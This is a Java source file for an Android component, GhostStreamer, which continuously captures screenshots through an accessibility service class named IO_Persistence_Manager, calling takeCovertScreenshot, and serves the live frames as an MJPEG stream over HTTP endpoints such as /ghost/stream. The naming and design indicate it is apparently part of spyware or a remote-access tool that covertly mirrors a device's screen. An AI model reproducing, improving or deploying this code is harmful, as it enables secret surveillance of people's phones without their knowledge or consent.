package com.labs.labrats;

import android.os.SystemClock;
import android.util.Log;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * GHOST_STREAM v2: continuous background frame pump for realtime screen mirroring.
 *
 * Old design (v1): every HTTP GET on /ghost/screenshot triggered a fresh OS
 * screenshot and blocked a NanoHTTPD worker up to 3s, while the browser polled
 * with a new Image() per frame. Result: ~1-3 fps, BUSY errors, multi-second lag.
 *
 * New design (v2):
 *  - One dedicated pump thread captures + encodes frames continuously
 *    (adaptive sleep keeps the target fps without overlapping captures).
 *  - Latest frame is cached; /ghost/frame serves it instantly (never BUSY).
 *  - /ghost/stream pushes an MJPEG multipart response the browser renders
 *    natively in <img> — no per-frame HTTP handshake, no Image() churn.
 *  - Loop idles out 30s after last viewer/demand so it costs nothing standby.
 */
public class GhostStreamer {

    private static final String TAG = "GhostStreamer";
    private static volatile GhostStreamer instance;

    public static GhostStreamer get() {
        if (instance == null) {
            synchronized (GhostStreamer.class) {
                if (instance == null) instance = new GhostStreamer();
            }
        }
        return instance;
    }

    /** Capture profiles: width px / JPEG quality / target fps. */
    public enum Profile {
        SMOOTH(480, 45, 12),
        BALANCED(600, 55, 10),
        SHARP(720, 65, 7);

        public final int width;
        public final int quality;
        public final int targetFps;

        Profile(int width, int quality, int targetFps) {
            this.width = width;
            this.quality = quality;
            this.targetFps = targetFps;
        }
    }

    /** Immutable snapshot of the latest encoded frame. */
    public static final class Frame {
        public final byte[] data;
        public final long seq;
        public final long timeMs;
        public final int width;
        public final int height;

        Frame(byte[] data, long seq, long timeMs, int width, int height) {
            this.data = data;
            this.seq = seq;
            this.timeMs = timeMs;
            this.width = width;
            this.height = height;
        }
    }

    private static final long IDLE_TIMEOUT_MS = 30 * 1000;
    private static final long LATCH_TIMEOUT_MS = 3000;

    private volatile Profile profile = Profile.BALANCED;
    private volatile IO_Persistence_Manager ghost;
    private volatile Thread loopThread;
    private volatile boolean stopRequested = false;
    private volatile long lastDemandMs = 0;
    private final AtomicInteger viewers = new AtomicInteger(0);

    private final Object frameLock = new Object();
    private Frame latest;
    private long seqCounter = 0;
    private volatile double measuredFps = 0;
    private volatile long lastFrameMs = 0;

    private GhostStreamer() {
        applyProfileToEncoder();
    }

    /** Point the pump at the live accessibility service (safe to call often). */
    public synchronized void ensureRunning(IO_Persistence_Manager service) {
        if (service != null) ghost = service;
        lastDemandMs = SystemClock.uptimeMillis();
        stopRequested = false;
        if (loopThread == null || !loopThread.isAlive()) {
            loopThread = new Thread(this::pumpLoop, "GhostStream");
            loopThread.setDaemon(true);
            loopThread.start();
            Log.d(TAG, "pump started profile=" + profile.name());
        }
    }

    /** Record demand without opening a stream (frame/stat/quality hits). */
    public void poke() {
        lastDemandMs = SystemClock.uptimeMillis();
    }

    public void addViewer() {
        viewers.incrementAndGet();
        poke();
    }

    public void removeViewer() {
        viewers.decrementAndGet();
        poke();
    }

    public synchronized void stop() {
        stopRequested = true;
    }

    public boolean isRunning() {
        Thread t = loopThread;
        return t != null && t.isAlive();
    }

    public int viewerCount() {
        return Math.max(0, viewers.get());
    }

    public Frame latest() {
        synchronized (frameLock) {
            return latest;
        }
    }

    public String getProfileName() {
        return profile.name().toLowerCase();
    }

    public int getTargetFps() {
        return profile.targetFps;
    }

    public double getMeasuredFps() {
        return measuredFps;
    }

    /** Switch profile live; takes effect on the next captured frame. */
    public synchronized boolean setProfile(String name) {
        if (name == null) return false;
        try {
            Profile p = Profile.valueOf(name.trim().toUpperCase());
            profile = p;
            applyProfileToEncoder();
            poke();
            Log.d(TAG, "profile -> " + p.name());
            return true;
        } catch (IllegalArgumentException e) {
            return false;
        }
    }

    private void applyProfileToEncoder() {
        Api30Helper.CAPTURE_WIDTH = profile.width;
        Api30Helper.CAPTURE_JPEG_Q = profile.quality;
    }

    private boolean wanted() {
        if (stopRequested) return false;
        if (viewers.get() > 0) return true;
        return SystemClock.uptimeMillis() - lastDemandMs < IDLE_TIMEOUT_MS;
    }

    private void pumpLoop() {
        try {
            while (wanted()) {
                IO_Persistence_Manager svc = ghost;
                if (svc == null || !wanted()) break;

                long t0 = SystemClock.uptimeMillis();
                captureOnce(svc);
                if (!wanted()) break;

                long interval = 1000L / Math.max(1, profile.targetFps);
                long elapsed = SystemClock.uptimeMillis() - t0;
                long sleep = interval - elapsed;
                if (sleep > 0) {
                    try {
                        Thread.sleep(sleep);
                    } catch (InterruptedException e) {
                        break;
                    }
                }
            }
        } finally {
            synchronized (GhostStreamer.this) {
                if (Thread.currentThread() == loopThread) loopThread = null;
            }
            Log.d(TAG, "pump idle");
        }
    }

    private void captureOnce(IO_Persistence_Manager svc) {
        final CountDownLatch latch = new CountDownLatch(1);
        final byte[][] out = new byte[1][];
        final int[] dims = new int[2];
        try {
            svc.takeCovertScreenshot(new ScreenshotCallback() {
                @Override
                public void onSuccess(byte[] jpegData) {
                    out[0] = jpegData;
                    latch.countDown();
                }

                @Override
                public void onFailure(String err) {
                    latch.countDown();
                }
            });
            boolean done = latch.await(LATCH_TIMEOUT_MS, TimeUnit.MILLISECONDS);
            if (done && out[0] != null && out[0].length > 1024) {
                // Decode bounds only for stat readout (cheap, no full decode kept).
                android.graphics.BitmapFactory.Options opts = new android.graphics.BitmapFactory.Options();
                opts.inJustDecodeBounds = true;
                android.graphics.BitmapFactory.decodeByteArray(out[0], 0, out[0].length, opts);
                dims[0] = opts.outWidth;
                dims[1] = opts.outHeight;
                store(out[0], dims[0], dims[1]);
            } else {
                // Capture miss (BUSY/timeout) — keep serving the stale frame, back off briefly.
                try {
                    Thread.sleep(120);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "capture: " + e.getMessage());
        }
    }

    private void store(byte[] jpeg, int w, int h) {
        long now = SystemClock.uptimeMillis();
        synchronized (frameLock) {
            seqCounter++;
            latest = new Frame(jpeg, seqCounter, now, w, h);
        }
        if (lastFrameMs != 0) {
            double dt = Math.max(1, now - lastFrameMs) / 1000.0;
            double inst = 1.0 / dt;
            measuredFps = measuredFps == 0 ? inst : measuredFps * 0.7 + inst * 0.3;
        }
        lastFrameMs = now;
    }
}
